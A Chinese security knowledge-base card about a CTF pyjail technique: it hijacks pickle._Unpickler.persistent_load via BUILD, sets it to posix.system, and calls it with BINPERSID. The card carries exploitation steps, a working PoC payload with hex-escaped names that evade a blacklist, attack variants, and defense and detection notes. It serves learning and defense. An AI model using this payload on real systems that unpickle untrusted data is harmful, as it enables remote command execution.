---
id: web-python-deserialization-unpickler-persistent-load-system
title: Pickle _Unpickler.persistent_load 劫持：BUILD 把 persistent_load 设为 posix.system，BINPERSID 触发命令
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-unpickler-persistent-load-hijack
tags:
- python
- pickle
- deserialization
- unpickler
- persistent-load
- binpersid
- rce
- pyjail
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T13:49:40+08:00'
  notes: 已对照原文核对 payload 逐字节一致；修正卡内 BUILD 语义为对 pickle._Unpickler 类对象 setattr（原文 payload 的 slotstate 路径），posix.system 与 BINPERSID 触发链一致；PoC 未在本机执行。
url: /docs/web/python/deserialization/web-python-deserialization-unpickler-persistent-load-system/
draft: false
kb_aliases:
- persistent_load 劫持
- pickle BINPERSID
- _Unpickler BUILD
- posix.system pickle
- pyjail pickle 逃逸
- easyjail
---

## 一句话结论

Python pickle 的 `_Unpickler` 有一个 `persistent_load` 回调，`BINPERSID` opcode 会把栈上的字符串交给它；攻击者用 `GLOBAL`/`STACK_GLOBAL` 导入 `pickle._Unpickler`，用 `BUILD` 把 `_Unpickler` 的 `persistent_load` 改成 `posix.system`，再 `BINPERSID` 传入 `cat /flag`，即可在反序列化阶段执行命令，且无需出现 `os`/`import` 等被黑名单拦截的字符串。

## 原理

- **persistent_load 回调**：pickle 协议支持“持久化 ID”；`BINPERSID`（`Q`）从栈上弹出对象并调用当前 Unpickler 的 `persistent_load(obj)`。默认实现抛异常，但该属性可以被覆盖（本链覆盖的是 `_Unpickler` 类属性）。
- **BUILD 改属性**：`BUILD`（`b`）用栈上的 state 更新对象属性；payload 把 `(None, {'persistent_load': <callable>})` 作为 BUILD 的 slotstate（元组第二项），对栈顶的 `pickle._Unpickler` 类对象执行 `setattr`，使当前 `_Unpickler` 实例解析 `persistent_load` 时取到任意可调用对象。
- **导入 posix.system**：`STACK_GLOBAL`（`\x93`）从栈上弹出模块名与属性名并导入；用字符串 `'p\x6f\x73ix'`（posix）与 `'sy\x73tem'`（system）可绕过只做明文子串匹配的黑名单（不含 `os`/`sys`/`import`/`set`）。
- **触发顺序**：payload 先压入 `pickle._Unpickler` 类，`BUILD` 直接对该类设置 `persistent_load`（无需实例化）；随后压入命令字符串，`BINPERSID` 调用 `posix.system('cat /flag')`。
- **为什么是 RCE**：`posix.system` 与 `os.system` 等价，直接调用 libc system；执行发生在 `pickle.loads` 的反序列化阶段，不需要应用显式调用任何危险函数。
- **前提**：应用对不可信数据使用 `pickle.load(s)`；黑名单只检查部分字符串而非 opcode/类白名单；`posix` 模块可用。

## 触发条件

- 应用存在 `pickle.loads(user_input)`、`pickle.load(file)` 或等价反序列化入口。
- 输入过滤/黑名单只匹配 `os`、`sys`、`import`、`set` 等明文，不限制 `_Unpickler`、`persistent_load`、`posix` 或十六进制转义。
- 目标 Python 环境有 `posix` 模块（Linux 默认有）且允许执行命令。
- 反序列化进程权限足以读取 flag/执行命令。

## 利用步骤

1. 构造 payload：`\x80\x04`（协议 4）+ `c pickle\n_Unpickler\n`（GLOBAL 导入类）+ `(N`（压入 None 作为 BUILD 的第一个参数）。
2. 压入字典：键 `persistent_load`，值通过 `S'p\x6f\x73ix'`、`S'sy\x73tem'`、`\x93` 导入 `posix.system`；`d` 闭合字典，`t` 转元组，`b` 执行 BUILD 设置属性。
3. 压入命令字符串 `Vcat /flag\n`，`Q` 触发 `BINPERSID`，调用 `persistent_load('cat /flag')`。
4. `.` 结束；base64 编码后提交给目标的反序列化入口。
5. 观察命令输出/文件写入；授权测试用 `id` 或写标记文件，不读取真实数据。

## PoC

```python
import base64

payload = (
    b'\x80\x04'
    b'cpickle\n_Unpickler\n'          # 压入 pickle._Unpickler 类
    b'(N'                              # BUILD 的第一个参数 None
    b'('                               # 开始字典 state
    b"S'persistent_load'\n"
    b"S'p\\x6f\\x73ix'\n"              # 'posix'，避开 os 子串
    b"S'sy\\x73tem'\n"                 # 'system'，避开 set 子串
    b'\x93'                            # STACK_GLOBAL -> posix.system
    b'dt'                              # 闭合字典并转元组
    b'b'                               # BUILD：设置 persistent_load
    b'Vcat /flag\n'                    # 压入命令
    b'Q'                               # BINPERSID -> persistent_load('cat /flag')
    b'.'
)
print(base64.b64encode(payload).decode())
```

文章在 pyjail 中提交该 base64 后执行 `cat /flag` 得到 flag；黑名单中的 `os`、`sys`、`set`、`import` 均未出现在 payload 明文中。

## 变体与关联

- 变体：把 `persistent_load` 设为 `posix.popen`、`subprocess.Popen`、`builtins.eval` 等；或用 `REDUCE` 直接调用可调用对象。
- 变体：用 `pickle.Unpickler.find_class` 覆盖/绕过类白名单；或利用 `__reduce__` 的 `GLOBAL`/`STACK_GLOBAL` 导入任意模块。
- 变体：编码层用十六进制、`\x` 转义、字符串拼接、`getattr` 动态取属性，规避不同黑名单。
- 关联：[[web-python-deserialization-pickle-codetype-function-hijack]]（pickle 函数劫持）、[[web-python-deserialization-restricted-unpickler-getattr-bypass]]（受限 Unpickler 绕过）、[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]（模型 pickle RCE）。

## 检测与防御

- 防御：不要对不可信数据使用 pickle；改用 JSON/MessagePack 等无执行能力的格式。
- 防御：必须使用时用 `pickle.Unpickler.find_class` 白名单限制可导入类，禁止 `persistent_load`/`BINPERSID`/`GLOBAL` 等危险 opcode，或在隔离进程/容器中反序列化。
- 检测：扫描 pickle 流中的 `c`/`\x93`/`b`/`Q` opcode 与 `_Unpickler`、`persistent_load`、`posix`、`system` 等字符串；监控反序列化进程派生的子进程与命令执行。
- 响应：隔离应用，清理恶意文件/缓存，轮换凭据，修复反序列化入口。
